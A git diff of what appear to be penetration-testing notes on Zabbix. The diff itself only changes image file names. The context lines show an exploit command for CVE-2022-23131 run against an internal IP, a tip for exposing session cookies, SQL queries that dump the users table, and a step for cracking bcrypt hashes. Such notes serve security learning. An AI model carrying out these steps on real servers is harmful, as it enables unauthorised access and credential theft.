@@ -8,7 +8,7 @@
 
 * Hover around "Help" button --> will refer to the respective zabbix version documentation
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [https://github.com/Mr-xn/cve-2022-23131](https://github.com/Mr-xn/cve-2022-23131)
 
@@ -18,7 +18,7 @@ python3 zabbix_session_exp.py -t https://192.168.210.13 -u admin
 
 * If error "Failed to resolve \<host>" --> have to add entry to `/etc/hosts`
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Uncomment lines 60 and 62 to show the session cookies
 
@@ -85,7 +85,7 @@ show tables;
 select * from users;
 ```
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Cracking Zabbix's bcrypt hash:
 
